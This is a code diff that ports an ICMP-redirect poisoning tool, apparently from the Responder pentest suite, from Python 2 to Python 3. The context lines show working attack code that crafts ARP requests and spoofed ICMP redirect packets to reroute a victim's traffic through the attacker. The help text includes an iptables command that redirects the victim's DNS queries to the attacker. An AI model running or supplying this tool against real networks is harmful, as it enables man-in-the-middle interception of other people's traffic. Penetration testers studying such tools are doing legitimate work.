@@ -19,14 +19,16 @@ import struct
 import optparse
 import pipes
 import sys
+import codecs
 from socket import *
 sys.path.append('../')
 from odict import OrderedDict
 from random import randrange
 from time import sleep
 from subprocess import call
-from packets import Packet
 
+if (sys.version_info < (3, 0)):
+   sys.exit('This script is meant to be run with Python3')
 parser = optparse.OptionParser(usage='python %prog -I eth0 -i 10.20.30.40 -g 10.20.30.254 -t 10.20.30.48 -r 10.20.40.1',
                                prog=sys.argv[0],
                                )
@@ -78,13 +80,53 @@ def Show_Help(ExtraHelpData):
 
 MoreHelp = "Note that if the target is Windows, the poisoning will only last for 10mn, you can re-poison the target by launching this utility again\nIf you wish to respond to the traffic, for example DNS queries your target issues, launch this command as root:\n\niptables -A OUTPUT -p ICMP -j DROP && iptables -t nat -A PREROUTING -p udp --dst %s --dport 53 -j DNAT --to-destination %s:53\n\n"%(ToThisHost,OURIP)
 
+#Python version
+if (sys.version_info > (3, 0)):
+    PY2OR3     = "PY3"
+else:
+    PY2OR3  = "PY2"
+
+def StructWithLenPython2or3(endian,data):
+    #Python2...
+    if PY2OR3 == "PY2":
+        return struct.pack(endian, data)
+    #Python3...
+    else:
+        return struct.pack(endian, data).decode('latin-1')
+
+def NetworkSendBufferPython2or3(data):
+    if PY2OR3 == "PY2":
+        return str(data)
+    else:
+        return bytes(str(data), 'latin-1')
+
+def NetworkRecvBufferPython2or3(data):
+    if PY2OR3 == "PY2":
+        return str(data)
+    else:
+        return str(data.decode('latin-1'))
+
 def GenCheckSum(data):
     s = 0
     for i in range(0, len(data), 2):
         q = ord(data[i]) + (ord(data[i+1]) << 8)
         f = s + q
         s = (f & 0xffff) + (f >> 16)
-    return struct.pack("<H",~s & 0xffff)
+    return StructWithLenPython2or3("<H",~s & 0xffff)
+
+class Packet():
+	fields = OrderedDict([
+		("data", ""),
+	])
+	def __init__(self, **kw):
+		self.fields = OrderedDict(self.__class__.fields)
+		for k,v in kw.items():
+			if callable(v):
+				self.fields[k] = v(self.fields[k])
+			else:
+				self.fields[k] = v
+	def __str__(self):
+		return "".join(map(str, self.fields.values()))
 
 #####################################################################
 #ARP Packets
@@ -110,8 +152,8 @@ class ARPWhoHas(Packet):
     ])
 
     def calculate(self):
-        self.fields["DstIP"] = inet_aton(self.fields["DstIP"])
-        self.fields["SenderIP"] = inet_aton(OURIP)
+        self.fields["DstIP"] = inet_aton(self.fields["DstIP"]).decode('latin-1')
+        self.fields["SenderIP"] = inet_aton(OURIP).decode('latin-1')
 
 #####################################################################
 #ICMP Redirect Packets
@@ -141,11 +183,11 @@ class IPPacket(Packet):
 
     def calculate(self):
         self.fields["TID"] = chr(randrange(256))+chr(randrange(256))
-        self.fields["SrcIP"] = inet_aton(str(self.fields["SrcIP"]))
-        self.fields["DestIP"] = inet_aton(str(self.fields["DestIP"]))
+        self.fields["SrcIP"] = inet_aton(str(self.fields["SrcIP"])).decode('latin-1')
+        self.fields["DestIP"] = inet_aton(str(self.fields["DestIP"])).decode('latin-1')
         # Calc Len First
         CalculateLen = str(self.fields["VLen"])+str(self.fields["DifField"])+str(self.fields["Len"])+str(self.fields["TID"])+str(self.fields["Flag"])+str(self.fields["FragOffset"])+str(self.fields["TTL"])+str(self.fields["Cmd"])+str(self.fields["CheckSum"])+str(self.fields["SrcIP"])+str(self.fields["DestIP"])+str(self.fields["Data"])
-        self.fields["Len"] = struct.pack(">H", len(CalculateLen))
+        self.fields["Len"] = StructWithLenPython2or3(">H", len(CalculateLen))
         # Then CheckSum this packet
         CheckSumCalc =str(self.fields["VLen"])+str(self.fields["DifField"])+str(self.fields["Len"])+str(self.fields["TID"])+str(self.fields["Flag"])+str(self.fields["FragOffset"])+str(self.fields["TTL"])+str(self.fields["Cmd"])+str(self.fields["CheckSum"])+str(self.fields["SrcIP"])+str(self.fields["DestIP"])
         self.fields["CheckSum"] = GenCheckSum(CheckSumCalc)
@@ -160,7 +202,7 @@ class ICMPRedir(Packet):
     ])
 
     def calculate(self):
-        self.fields["GwAddr"] = inet_aton(OURIP)
+        self.fields["GwAddr"] = inet_aton(OURIP).decode('latin-1')
         CheckSumCalc =str(self.fields["Type"])+str(self.fields["OpCode"])+str(self.fields["CheckSum"])+str(self.fields["GwAddr"])+str(self.fields["Data"])
         self.fields["CheckSum"] = GenCheckSum(CheckSumCalc)
 
@@ -177,18 +219,18 @@ def ReceiveArpFrame(DstAddr):
     s.settimeout(5)
     Protocol = 0x0806
     s.bind((Interface, Protocol))
-    OurMac = s.getsockname()[4]
+    OurMac = s.getsockname()[4].decode('latin-1')
     Eth = EthARP(SrcMac=OurMac)
     Arp = ARPWhoHas(DstIP=DstAddr,SenderMac=OurMac)
     Arp.calculate()
     final = str(Eth)+str(Arp)
     try:
-        s.send(final)
+        s.send(NetworkSendBufferPython2or3(final))
         data = s.recv(1024)
         DstMac = data[22:28]
-        DestMac = DstMac.encode('hex')
-        PrintMac = ":".join([DestMac[x:x+2] for x in range(0, len(DestMac), 2)])
-        return PrintMac,DstMac
+        DestMac = codecs.encode(DstMac, 'hex')
+        PrintMac = ":".join([DestMac[x:x+2].decode('latin-1') for x in range(0, len(DestMac), 2)])
+        return PrintMac,DstMac.decode('latin-1')
     except:
         print("[ARP]%s took too long to Respond. Please provide a valid host.\n"%(DstAddr))
         exit(1)
@@ -209,7 +251,7 @@ def IcmpRedirectSock(DestinationIP):
     IPPack = IPPacket(SrcIP=OriginalGwAddr,DestIP=VictimIP,TTL="\x40",Data=str(ICMPPack))
     IPPack.calculate()
     final = str(Eth)+str(IPPack)
-    s.send(final)
+    s.send(NetworkSendBufferPython2or3(final))
     print('\n[ICMP]%s should have been poisoned with a new route for target: %s.\n'%(VictimIP,DestinationIP))
 
 def FindWhatToDo(ToThisHost2):
